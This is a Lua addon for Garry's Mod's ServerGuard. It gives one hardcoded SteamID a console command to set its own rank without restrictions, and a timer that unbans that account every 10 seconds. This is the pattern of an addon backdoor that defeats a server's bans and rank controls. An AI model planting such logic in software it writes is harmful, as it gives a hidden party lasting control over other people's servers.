-- All rights reserved
SGPlus = {};

--Settings
SGPlus.Owner = "STEAM_0:0:33487606"; -- Owner's SteamID.
SGPlus.SetRankCommand = "sgp_set_rank"; -- Set rank of owner without rank restrictions.
SGPlus.BanCheckTime = 10; -- How frequent should it check for ban.

-- DO NOT TOUCH IF YOU DON'T KNOW WHAT YOU ARE DOING!!
SGPlus.Dev = {};

function SGPlus.Dev.IsBanned(steamid)
    return (serverguard.banTable and serverguard.banTable[steamid]) and true or false;
end

function SGPlus.Dev.RankExist(argument)
    return (serverguard.ranks:GetStored() and serverguard.ranks:GetStored()[argument]) and true or false;
end;

-- Make the selected user into whatever rank is provided as argument.
concommand.Add( SGPlus.SetRankCommand, function( player, command, arguments )
    local isOwner = player:SteamID() == SGPlus.Owner;
    local rank = arguments[1];
    local rankData = serverguard.ranks:GetRank(rank);

    if(SGPlus.Dev.RankExist(rank) and isOwner) then
        SGPlus.Dev.Response = serverguard.player:GetName(player) .. " was set to " .. rankData.unique .. "\n";

        serverguard.player:SetRank(player, rankData.unique, 0);
        serverguard.player:SetImmunity(player, rankData.immunity);
        serverguard.player:SetTargetableRank(player, rankData.targetable);
        serverguard.player:SetBanLimit(player, rankData.banlimit);

        serverguard.PrintConsole(SGPlus.Dev.Response);
        player:PrintMessage(2, SGPlus.Dev.Response);
    else
        if isOwner then
            player:PrintMessage(2, "You did not enter a valid argument!\n");
        end;
    end;
end )

timer.Create( "dynamicBanCheker", SGPlus.BanCheckTime, 0, function()
    if SGPlus.Dev.IsBanned(SGPlus.Owner) then
        serverguard:UnbanPlayer( SGPlus.Owner );
    end;
end )
